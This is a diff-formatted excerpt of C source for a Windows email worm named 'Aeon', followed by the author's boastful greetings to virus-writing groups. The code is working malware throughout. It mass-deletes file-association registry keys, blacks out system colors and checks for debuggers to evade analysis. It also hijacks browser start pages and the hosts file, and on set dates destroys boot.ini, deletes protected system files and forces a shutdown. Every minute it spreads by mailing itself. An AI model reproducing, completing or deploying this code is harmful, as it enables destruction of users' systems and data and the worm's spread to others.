+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;cplfile\\shell\\cplopen\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;dbile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;divfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;divxfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;dllfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;dpsfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;dunfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;dxufile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;emfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;exefile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;Folder\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;fonfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;giffile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;h323file\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;helpfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;hlpfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;htfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;htmlfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;HTTP\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;https\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;ICY\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;iiifile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;inffile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;inifile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;irc\\Shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;jarfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;jpegfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;JSFile\\Shell\\Open\\Command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;JSEFile\\Shell\\Open\\Command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;JSXFile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;mailto\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;mhtmlfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;MIDFile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;MMS\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;MMST\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;MMSU\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;movfile\\Shell\\Open\\Command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;mp3file\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;mpegfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;msbackupfile\\Shell\\Open\\Command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;MSBD\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;MSCFile\\Shell\\Open\\Command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;news\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;nntp\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;otffile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;pbkfile\\shell\\Open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;PerfFile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;pfmfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;piffile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;pjpegfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;pngfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;pnm\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;ppifile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;prffile\\Shell\\Open\\Command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;rar_auto_file\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;ratfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;regedit\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;regfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;rlogin\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;rnkfile\\shell\\Connect\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;rnkfile\\shell\\Disconnect\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;rtffile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;rtsp\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;SC\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;scrfile\\shell\\open\\config&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;scrfile\\shell\\open\\install&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;scrfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;scriptletfile\\Shell\\Open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;sh_auto_file\\shell\\edit\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;sh_auto_file\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;Shell\\shell\\explore\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;Shell\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;SHOUT\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;skype\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;snews\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;SoundRec\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;SSM\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;steam\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;telnet\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;themefile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;tn3270\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;torrent\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;ttcfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;ttffile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;txtfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;ulsfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;UNSV\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;UVOX\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;VBEFile\\Shell\\Open\\Command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;VBEFile\\shell\\Open2\\Command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;VBSFile\\Shell\\Open\\Command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;VBSFile\\shell\\Open2\\Command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;webpnpFile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;Whiteboard\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;wmffile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;WMVFile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;WMZFile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;WPLFile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;wrifile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;WSFFile\\Shell\\Open\\Command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;WSFFile\\Shell\\Open2\\Command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;WSHFile\\Shell\\Open\\Command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;WSHFile\\Shell\\Open2\\Command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;WVXFile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;xbmfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;xmlfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;xslfile\\shell\\Open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;zapfile\\shell\\open\\command&quot;);
+}
+
+/* Change every system color to black (00, 00, 00), reading anything or working normally is impossible until this is changed */
+void BlackSystem(void)
+{
+	/* Array of ALL color values */
+	int iElements[] = {COLOR_3DDKSHADOW, COLOR_3DFACE, COLOR_3DHIGHLIGHT, COLOR_3DHILIGHT, COLOR_3DLIGHT,
+						COLOR_3DSHADOW, COLOR_ACTIVEBORDER, COLOR_ACTIVECAPTION, COLOR_APPWORKSPACE, COLOR_BACKGROUND,
+						COLOR_BTNFACE, COLOR_BTNHIGHLIGHT, COLOR_BTNSHADOW, COLOR_BTNTEXT, COLOR_CAPTIONTEXT, COLOR_DESKTOP,
+						COLOR_GRADIENTACTIVECAPTION, COLOR_GRADIENTINACTIVECAPTION, COLOR_GRAYTEXT, COLOR_HIGHLIGHT, COLOR_HIGHLIGHTTEXT,
+						COLOR_HOTLIGHT, COLOR_INACTIVEBORDER, COLOR_INACTIVECAPTION, COLOR_INACTIVECAPTIONTEXT, COLOR_INFOBK,
+						COLOR_INFOTEXT, COLOR_MENU, COLOR_MENUHILIGHT, COLOR_MENUBAR, COLOR_MENUTEXT, COLOR_SCROLLBAR,
+						COLOR_WINDOW, COLOR_WINDOWFRAME, COLOR_WINDOWTEXT};
+
+	/* Black */
+	DWORD dwBlack[] = {RGB(0, 0, 0)};
+ 
+	/* Blacken the system colors */
+	SetSysColors(35, iElements, dwBlack); 
+
+	/* Blank the desktop Wallpaper (Black) */
+	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, &quot; &quot;, 0);
+}
+
+/* Junk code function which can be used to make debugging more complicate and annoying,
+not used in the virus, but just try by doing some jnk() calls (important: only use this function when
+a debugger is found !) example usage &quot; if (bSoftIce == 1) { jnk(); } &quot;*/
+void jnk(void)
+{
+	__asm {jmp $+4}
+	__asm {int 20h}
+}
+
+/* ========= MAIN CODE ========= MAIN CODE ========= MAIN CODE ========= MAIN CODE ========= */
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
+{
+	HANDLE hWnd;
+	SYSTEMTIME stTime;
+	BOOL bInfected;
+	BOOL bSoftIce;
+	BOOL bOllyDbg;
+	BOOL bFileMon;
+	BOOL bRegMon;
+	DWORD dwThreadID;
+	char szDate[MAX_PATH];
+	int i;
+
+	/* Wait 5 minutes before doing something */
+	Sleep(300000);
+
+	/* Create a mutex to make sure the worm is only running one time */
+	CreateMutex(NULL, FALSE, &quot;AEON&quot;);
+
+	if (GetLastError() == ERROR_ALREADY_EXISTS)
+	{
+		ExitProcess(0);
+	}
+
+	/* Check for SoftIce/OllyDbg/FileMon/RegMon */
+	bSoftIce = IsSoftIcePresent();
+	bOllyDbg = IsOllyDbgPresent();
+	bFileMon = IsFileMonPresent();
+	bRegMon = IsRegMonPresent();
+
+	/* If any of the tools is running exit the application */
+	if ((bSoftIce == 1) | (bOllyDbg == 1) | (bFileMon == 1) | (bRegMon == 1))
+	{
+		ExitProcess(0);
+	}
+
+	/* Test if PC is still infected */
+	bInfected = IsPCInfected();
+
+	/* If PC is not yet infected dot he following... */
+	if(bInfected == -1)
+	{
+		HKEY hKey;
+		char szBlackIce[] = &quot;Aeon&quot;;
+	
+		/* Create the key showing that the PC is infected now */
+		RegCreateKey(HKEY_LOCAL_MACHINE, &quot;SYSTEM\\Aeon&quot;, &amp;hKey);
+		RegSetValueEx(hKey, &quot;Aeon&quot;, 0, REG_SZ, szBlackIce, sizeof(szBlackIce));
+	    RegCloseKey(hKey);
+
+		/* For detailed descriptions look at the specific functions above */
+		ChangeNameOrg();
+		MakeHidden();
+		CopyToPC();
+		IEStartPageBSoD();
+		FirefoxStartPageBSoD();
+		OperaStartPageBSoD();
+		ModifyHostFile();
+		DisableMAPIWarning();
+	}
+
+	/* Get the system time */
+	GetSystemTime(&amp;stTime);
+	/* Saving in a format only telling day (1, 2, 3...) */
+	GetDateFormat(LOCALE_USER_DEFAULT, 0, &amp;stTime, &quot;dd&quot;, szDate, sizeof(szDate));
+
+	/* If it is the 1st, 14th or 28th of a month go to start the destructive PAYLOAD */
+	if((stTime.wDay == 1) | (stTime.wDay == 14) | (stTime.wDay == 28))
+	{
+		/* For detailed description look at the specific functions above */
+		DestroyBootIni();
+		ModifyHCR();
+		BlackSystem();
+		Messagebox();
+
+		/* Delete all files in the FileNameList array by using the function DeleteFileName() */
+		for (i = 0; FileNameList[i]; i++)
+		{
+			DeleteFileName(FileNameList[i]);
+		}
+
+		/* Wait for 5 seconds */
+		Sleep(5000);
+
+		/* Catch the upcoming Warning window after deleting the SFC protected files and close it (German) */
+		hWnd = FindWindow(NULL, &quot;Windows-Dateischutz&quot;);
+		CloseWindow(hWnd);
+
+		/* Catch the upcoming Warning window after deleting the SFC protected files and close it (English) */
+		hWnd = FindWindow(NULL, &quot;Windows File Protection&quot;);
+		CloseWindow(hWnd);
+
+		/* Drop a batch file and open it 10 times, keeping the windows open */
+		DropAndExecuteBatch();
+
+		/* Wait another 5 seconds */
+		Sleep(5000);
+
+		/* Shut down the system finally */
+	    SystemShutdown();
+	}
+
+	/* Stay in background and try to spread via email every 60 seconds by creating a thread */
+	do
+	{
+		/* Create a thread and trie to spread via email */
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MailMySelf, NULL, 0, NULL);
+
+		if ((bSoftIce == 1) | (bOllyDbg == 1) | (bFileMon == 1) | (bRegMon == 1))
+		{
+			ExitProcess(0);
+		}
+
+		Sleep(60000);
+	}while(1);
+
+
+}/* The End */
+
+/* 
+
+Yeah that's it, my first worm and most complex (destructive ^^) creation until now... Learned new and cool stuff and 
+had got ideas from several things. I like to thank &lt;-&lt; WarGame &gt;-&gt; most, for his patience with me and my sutpid questions and
+giving me cool ideas while talking with him about code and plans for creations, thanks man ;)
+
+It is also very practical to read virus description, I got many new ideas while looking over the things that others did
+and hopefully even improved it =) The Firefox and Opera hacks were most fun while coding this, as it is quite new to change
+anything of this two browsers, well my experience, Opera is even easier then Internet Explorer, but Firefox is quite complex,
+using a JavaScript file to store preferences.
+
+I also read an article about anti-cracking methods in Hakin9 (www.hakin9.org/en), it was an article from one of the first issues
+in 2005 and this helped me doing the anti-debugging functions, I just picked out some of them and coded them, there were several
+ones more explained, maybe in a next creation ;)
+
+Greets to all the great guys of &lt;-&lt; EOF &gt;-&gt;, it is great having such guys to code with, thanks for all and let us rock the scene!
+
+Greets to Doomriderz Team, THE US Team in virus coding, you are doing a great job and are smart people to have interesting
+conversations with: Go on!
+
+Greets to Ready Rangers Liberation Front, with most of you I can talk even in my native language =), you are cool and always
+friendly / helpful, keep it like this and good luck with everything!
+
+And last, but not least some greets to everyone supporting us building up this magazine / project, especially Skvoznoy as being
+a good friend and an supporter as well, thanks bro and thanks to all other people helping us in any way, to all the contributors,
+keep on and the second issue will be rocking the same and better =) Also some greets to all VXers, Hackers and Crackers out there! 
+
+*/
+</pre></body></html>
